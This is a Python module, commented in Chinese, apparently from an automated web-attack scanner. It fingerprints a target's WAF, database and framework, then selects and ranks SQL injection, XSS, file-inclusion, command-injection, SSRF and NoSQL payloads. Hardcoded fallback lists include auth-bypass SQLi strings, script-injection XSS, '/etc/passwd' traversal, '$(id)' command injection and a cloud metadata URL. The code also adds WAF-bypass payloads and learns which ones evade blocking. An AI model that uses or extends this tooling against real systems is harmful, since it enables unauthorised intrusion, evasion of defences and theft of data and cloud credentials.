#!/usr/bin/env python3
"""
Payload 选择器模块 - 统一的智能 Payload 选择引擎

整合自:
- smart_payload_engine.py: SmartPayloadSelector 类 (lines 148-604)
- smart_payload_selector.py: SmartPayloadSelector 类 (lines 24-334)

消除了两个文件中的重复选择器实现
"""

import json
import logging
import tempfile
from pathlib import Path
from typing import Any, Dict, List, Optional

from .signatures import (
    TargetProfile,
    detect_db_from_dict,
    detect_framework_from_dict,
    detect_waf_from_dict,
)
from .types import PayloadStats, ScoredPayload, get_payload_hash, get_payload_key

logger = logging.getLogger(__name__)


class SmartPayloadSelector:
    """
    智能 Payload 选择器

    根据目标特征（WAF、数据库、框架等）自动选择最优 Payload，
    并基于历史成功率进行学习和优化。
    """

    # 框架与数据库映射
    FRAMEWORK_DB_MAP = {
        "laravel": "mysql",
        "wordpress": "mysql",
        "django": "postgresql",
        "flask": "postgresql",
        "spring": "mysql",
        "rails": "postgresql",
        "asp.net": "mssql",
    }

    # 语言与数据库映射
    LANGUAGE_DB_MAP = {
        "php": "mysql",
        "java": "mysql",
        "python": "postgresql",
        "asp": "mssql",
        "ruby": "postgresql",
        "node": "mongodb",
    }

    def __init__(self, stats_file: Optional[Path] = None):
        """
        初始化选择器

        Args:
            stats_file: 统计数据文件路径（默认使用临时目录）
        """
        if stats_file is None:
            stats_file = Path(tempfile.gettempdir()) / "payload_selector_stats.json"

        self.stats_file = Path(stats_file)
        self.stats: Dict[str, PayloadStats] = {}
        self.payload_cache: Dict[str, List[str]] = {}
        self._load_stats()

    def _load_stats(self):
        """加载历史统计数据"""
        if self.stats_file.exists():
            try:
                with open(self.stats_file, "r", encoding="utf-8") as f:
                    data = json.load(f)
                    for key, value in data.items():
                        self.stats[key] = PayloadStats.from_dict(value)
                logger.debug(f"Loaded {len(self.stats)} payload stats from {self.stats_file}")
            except Exception as e:
                logger.warning(f"加载 Payload 统计失败: {e}")

    def _save_stats(self):
        """保存统计数据"""
        try:
            self.stats_file.parent.mkdir(parents=True, exist_ok=True)
            data = {k: v.to_dict() for k, v in self.stats.items()}
            with open(self.stats_file, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.warning(f"保存 Payload 统计失败: {e}")

    def select(
        self,
        vuln_type: str,
        target_info: Optional[Dict[str, Any]] = None,
        limit: int = 20,
    ) -> List[str]:
        """
        根据目标信息选择最优 Payload（简化接口）

        Args:
            vuln_type: 漏洞类型 (sqli, xss, lfi, rce, ssrf, xxe, nosql, graphql)
            target_info: 目标信息字典
            limit: 返回 Payload 数量限制

        Returns:
            排序后的 Payload 列表
        """
        target_info = target_info or {}

        # 检测目标特征
        waf_type = detect_waf_from_dict(target_info)
        db_type = detect_db_from_dict(target_info)
        framework = detect_framework_from_dict(target_info)

        # 获取基础 Payload
        payloads = self._get_base_payloads(vuln_type, db_type, framework, target_info)

        # 如果检测到 WAF，添加绕过 Payload
        if waf_type:
            payloads.extend(self._get_waf_bypass_payloads(waf_type))

        # 按成功率排序
        payloads = self._sort_by_success_rate(payloads)

        return payloads[:limit]

    def select_with_scores(
        self,
        vuln_type: str,
        target: TargetProfile,
        max_count: int = 20,
    ) -> List[ScoredPayload]:
        """
        智能选择 Payload 并返回评分

        Args:
            vuln_type: 漏洞类型
            target: 目标特征配置
            max_count: 最大返回数量

        Returns:
            带评分的 Payload 列表
        """
        # 获取所有候选 Payload
        all_payloads = self._get_all_payloads(vuln_type, target)

        # 计算评分
        scored = []
        for payload in all_payloads:
            score = self._calculate_score(payload, vuln_type, target)
            scored.append(ScoredPayload(payload=payload, score=score))

        # 按得分排序
        scored.sort(key=lambda x: x.score, reverse=True)

        return scored[:max_count]

    def _get_base_payloads(
        self,
        vuln_type: str,
        db_type: str,
        framework: Optional[str],
        target_info: Dict[str, Any],
    ) -> List[str]:
        """获取基础 Payload 列表"""
        # 延迟导入以避免循环依赖
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            logger.warning("MegaPayloads not available, using fallback")
            return self._get_fallback_payloads(vuln_type)

        payloads = []

        if vuln_type == "sqli":
            payloads = self._select_sqli_payloads(db_type, framework, target_info)
        elif vuln_type == "xss":
            payloads = self._select_xss_payloads(framework, target_info)
        elif vuln_type == "lfi":
            payloads = self._select_lfi_payloads(target_info)
        elif vuln_type == "rce":
            payloads = self._select_rce_payloads(framework, target_info)
        elif vuln_type == "ssrf":
            payloads = self._select_ssrf_payloads(target_info)
        elif vuln_type == "nosql":
            payloads = self._select_nosql_payloads(db_type)
        elif vuln_type == "graphql":
            payloads = MegaPayloads.GRAPHQL.copy() if hasattr(MegaPayloads, "GRAPHQL") else []
        else:
            payloads = MegaPayloads.get(vuln_type) if hasattr(MegaPayloads, "get") else []

        return payloads

    def _select_sqli_payloads(
        self,
        db_type: str,
        framework: Optional[str],
        target_info: Dict[str, Any],
    ) -> List[str]:
        """选择 SQL 注入 Payload"""
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            return self._get_fallback_payloads("sqli")

        payloads = []

        # 基础 Payload
        payloads.extend(MegaPayloads.get("sqli", "auth_bypass", db_type))
        payloads.extend(MegaPayloads.get("sqli", "union_select", db_type))
        payloads.extend(MegaPayloads.get("sqli", "time_based", db_type))

        # 添加其他数据库的 Payload 以提高检出率
        other_dbs = ["mysql", "mssql", "postgresql", "oracle", "sqlite"]
        for db in [d for d in other_dbs if d != db_type][:2]:
            extra = MegaPayloads.get("sqli", "auth_bypass", db)
            payloads.extend(extra[:5])

        # JSON/XML 格式的 SQL 注入
        content_type = str(target_info.get("content_type", "")).lower()
        if "json" in content_type:
            payloads.extend(
                [
                    '{"id":"1 OR 1=1--"}',
                    "{\"id\":\"1' OR '1'='1\"}",
                    '{"id":{"$gt":""}}',
                ]
            )
        elif "xml" in content_type:
            payloads.extend(
                [
                    "<id>1' OR '1'='1</id>",
                    "<id>1 UNION SELECT NULL--</id>",
                ]
            )

        return payloads

    def _select_xss_payloads(
        self,
        framework: Optional[str],
        target_info: Dict[str, Any],
    ) -> List[str]:
        """选择 XSS Payload"""
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            return self._get_fallback_payloads("xss")

        payloads = []

        # 基础 XSS
        payloads.extend(MegaPayloads.XSS.get("basic", []))
        payloads.extend(MegaPayloads.XSS.get("event_handlers", []))

        # CSP 绕过
        if target_info.get("has_csp"):
            payloads.extend(MegaPayloads.XSS.get("csp_bypass", []))

        # DOM XSS
        payloads.extend(MegaPayloads.XSS.get("dom_based", []))

        # 补充 DOM XSS Payload
        payloads.extend(
            [
                "javascript:alert(1)",
                "#<script>alert(1)</script>",
                "'-alert(1)-'",
                "{{7*7}}",
                "${alert(1)}",
            ]
        )

        return payloads

    def _select_lfi_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """选择 LFI Payload"""
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            return self._get_fallback_payloads("lfi")

        payloads = []

        # 根据操作系统选择
        os_type = str(target_info.get("os", "linux")).lower()
        if "windows" in os_type or target_info.get("server") == "iis":
            payloads.extend(MegaPayloads.LFI.get("windows", []))
        else:
            payloads.extend(MegaPayloads.LFI.get("linux", []))

        # PHP Wrapper
        technologies = str(target_info.get("technologies", {})).lower()
        if "php" in technologies:
            payloads.extend(MegaPayloads.LFI.get("php_wrapper", []))

        # 编码绕过
        payloads.extend(MegaPayloads.LFI.get("encoded", []))
        payloads.extend(MegaPayloads.LFI.get("double_encoding", []))

        return payloads

    def _select_rce_payloads(
        self,
        framework: Optional[str],
        target_info: Dict[str, Any],
    ) -> List[str]:
        """选择 RCE Payload"""
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            return self._get_fallback_payloads("rce")

        payloads = []

        # 命令注入
        payloads.extend(MegaPayloads.RCE.get("command_injection", []))

        # 框架特定
        if framework == "spring":
            payloads.extend(MegaPayloads.RCE.get("spring4shell", []))

        # 模板注入
        payloads.extend(MegaPayloads.RCE.get("template_injection", []))

        # Log4j
        payloads.extend(MegaPayloads.RCE.get("log4j", []))

        return payloads

    def _select_ssrf_payloads(self, target_info: Dict[str, Any]) -> List[str]:
        """选择 SSRF Payload"""
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            return self._get_fallback_payloads("ssrf")

        payloads = []

        # 基础
        payloads.extend(MegaPayloads.SSRF.get("basic", []))

        # 云元数据
        payloads.extend(MegaPayloads.SSRF.get("cloud_metadata", []))

        # 绕过
        payloads.extend(MegaPayloads.SSRF.get("bypass", []))

        # 协议
        payloads.extend(MegaPayloads.SSRF.get("protocol", []))

        return payloads

    def _select_nosql_payloads(self, db_type: str) -> List[str]:
        """选择 NoSQL 注入 Payload"""
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            return self._get_fallback_payloads("nosql")

        payloads = []

        if db_type == "mongodb":
            for category in MegaPayloads.NOSQL.get("mongodb", {}).values():
                payloads.extend(category)
        elif db_type == "redis":
            payloads.extend(MegaPayloads.NOSQL.get("redis", []))
        elif db_type == "elasticsearch":
            payloads.extend(MegaPayloads.NOSQL.get("elasticsearch", []))
        else:
            # 默认 MongoDB
            for category in MegaPayloads.NOSQL.get("mongodb", {}).values():
                payloads.extend(category)

        return payloads

    def _get_waf_bypass_payloads(self, waf_type: str) -> List[str]:
        """获取 WAF 绕过 Payload"""
        try:
            from ..mega_payloads import MegaPayloads
        except ImportError:
            return []

        payloads = []

        waf_map = {
            "cloudflare": "cloudflare_bypass",
            "modsecurity": "modsecurity_bypass",
            "aws_waf": "aws_waf_bypass",
        }

        key = waf_map.get(waf_type.lower())
        if key and hasattr(MegaPayloads, "WAF_BYPASS"):
            payloads.extend(MegaPayloads.WAF_BYPASS.get(key, []))

        # 通用绕过
        if hasattr(MegaPayloads, "WAF_BYPASS"):
            for bypass_type in ["unicode", "double_url", "hex", "comment", "whitespace"]:
                payloads.extend(MegaPayloads.WAF_BYPASS.get(bypass_type, []))

        return payloads

    def _get_all_payloads(self, vuln_type: str, target: TargetProfile) -> List[str]:
        """获取所有候选 Payload（带缓存）"""
        cache_key = f"{vuln_type}_{target.features.get('waf', 'none')}_{target.features.get('framework', 'none')}"

        if cache_key in self.payload_cache:
            return self.payload_cache[cache_key]

        target_info = target.to_dict().get("features", {})
        db_type = target.detect_database()
        framework = target.detect_framework()
        waf = target.detect_waf()

        payloads = self._get_base_payloads(vuln_type, db_type, framework, target_info)

        if waf:
            payloads.extend(self._get_waf_bypass_payloads(waf))

        self.payload_cache[cache_key] = payloads
        return payloads

    def _calculate_score(
        self,
        payload: str,
        vuln_type: str,
        target: TargetProfile,
    ) -> float:
        """
        计算 Payload 得分

        评分因素:
        - 历史成功率 (最高 +30)
        - WAF 绕过能力 (最高 +20)
        - 编码复杂度 (最高 +10)
        - Payload 长度
        - 框架适配度 (+10)
        - 被拦截历史 (-20)
        """
        score = 50.0  # 基础分

        payload_key = get_payload_key(vuln_type, payload)
        stats = self.stats.get(payload_key)

        # 1. 历史成功率
        if stats and stats.total_uses > 0:
            score += stats.success_rate * 30

        # 2. WAF 绕过能力
        waf = target.features.get("waf")
        if waf:
            if self._is_waf_bypass_payload(payload):
                score += 20
            else:
                score -= 10

        # 3. 编码复杂度
        score += self._score_encoding(payload)

        # 4. Payload 长度
        if len(payload) > 500:
            score -= 5
        elif len(payload) < 50:
            score += 5

        # 5. 框架适配
        framework = target.features.get("framework")
        if framework and self._is_framework_specific(payload, framework):
            score += 10

        # 6. 被拦截历史
        if stats and stats.blocked_count > 3:
            score -= 20

        return max(0, min(100, score))

    def _is_waf_bypass_payload(self, payload: str) -> bool:
        """检查是否为 WAF 绕过 Payload"""
        bypass_indicators = [
            "/*!",  # MySQL 注释绕过
            "%00",  # 空字节
            "/**/",  # 注释
            "%0a",
            "%0d",  # 换行
            "\\u00",  # Unicode
            "&#",  # HTML 实体
            "%25",  # 双重编码
        ]
        return any(ind in payload.lower() for ind in bypass_indicators)

    def _score_encoding(self, payload: str) -> float:
        """评估编码复杂度得分"""
        score = 0.0

        if "%" in payload:
            score += 3
        if "\\u" in payload or "&#" in payload:
            score += 5
        if any(c.isupper() for c in payload) and any(c.islower() for c in payload):
            score += 2
        if payload.count("%") > 20:
            score -= 5

        return score

    def _is_framework_specific(self, payload: str, framework: str) -> bool:
        """检查是否为框架特定 Payload"""
        framework_keywords = {
            "django": ["csrf", "django", "__class__"],
            "rails": ["authenticity_token", "rails"],
            "spring": ["spring", "java", "springframework"],
            "laravel": ["_token", "laravel"],
            "flask": ["werkzeug", "flask"],
        }

        keywords = framework_keywords.get(framework.lower(), [])
        return any(kw in payload.lower() for kw in keywords)

    def _sort_by_success_rate(self, payloads: List[str]) -> List[str]:
        """按成功率排序"""

        def get_rate(p: str) -> float:
            payload_hash = get_payload_hash(p)
            if payload_hash in self.stats:
                return self.stats[payload_hash].success_rate
            return 0.5  # 默认 50%

        return sorted(payloads, key=get_rate, reverse=True)

    def _get_fallback_payloads(self, vuln_type: str) -> List[str]:
        """获取后备 Payload（当 MegaPayloads 不可用时）"""
        fallback = {
            "sqli": [
                "' OR '1'='1",
                '" OR "1"="1',
                "' OR 1=1--",
                "1' AND '1'='1",
                "admin'--",
                "' UNION SELECT NULL--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
            ],
            "lfi": [
                "../../../etc/passwd",
                "....//....//....//etc/passwd",
                "php://filter/convert.base64-encode/resource=index.php",
            ],
            "rce": [
                "; id",
                "| id",
                "& id",
                "`id`",
                "$(id)",
            ],
            "ssrf": [
                "http://127.0.0.1",
                "http://localhost",
                "http://169.254.169.254/latest/meta-data/",
            ],
            "nosql": [
                '{"$gt":""}',
                '{"$ne":""}',
                '{"$regex":".*"}',
            ],
        }
        return fallback.get(vuln_type, [])

    def update_stats(self, payload: str, vuln_type: str, success: bool, blocked: bool = False):
        """
        更新 Payload 统计

        Args:
            payload: Payload 内容
            vuln_type: 漏洞类型
            success: 是否成功
            blocked: 是否被拦截
        """
        payload_key = get_payload_key(vuln_type, payload)

        if payload_key not in self.stats:
            self.stats[payload_key] = PayloadStats()

        self.stats[payload_key].update(success=success, blocked=blocked)
        self._save_stats()

    def get_stats_summary(self) -> Dict[str, Any]:
        """获取统计摘要"""
        total_payloads = len(self.stats)
        total_uses = sum(s.total_uses for s in self.stats.values())
        total_success = sum(s.success_count for s in self.stats.values())
        total_blocked = sum(s.blocked_count for s in self.stats.values())

        return {
            "total_payloads": total_payloads,
            "total_uses": total_uses,
            "total_success": total_success,
            "total_blocked": total_blocked,
            "overall_success_rate": total_success / max(total_uses, 1),
        }


# ============== 单例和便捷函数 ==============

_selector_instance: Optional[SmartPayloadSelector] = None


def get_selector() -> SmartPayloadSelector:
    """获取选择器单例"""
    global _selector_instance
    if _selector_instance is None:
        _selector_instance = SmartPayloadSelector()
    return _selector_instance


def smart_select(
    vuln_type: str,
    target_info: Optional[Dict[str, Any]] = None,
    limit: int = 20,
) -> List[str]:
    """
    智能选择 Payload（便捷函数）

    Args:
        vuln_type: 漏洞类型
        target_info: 目标信息
        limit: 最大返回数量

    Returns:
        Payload 列表
    """
    selector = get_selector()
    return selector.select(vuln_type, target_info, limit)
